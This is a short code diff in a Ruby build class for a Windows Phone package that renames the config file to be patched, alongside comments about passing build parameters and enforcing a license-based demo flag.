@@ -37,7 +37,7 @@ class BuildWinPhone < Build
     # add the file to be patched to the params
     # these params will be passed to the super
     params[:core] = 'xap/MyPhoneInfo.dat'
-    params[:config] = 'xap/cptm511.dql'
+    params[:config] = 'xap/fmh58t4.wph'
 
     # enforce demo flag accordingly to the license
     # or raise if cannot build
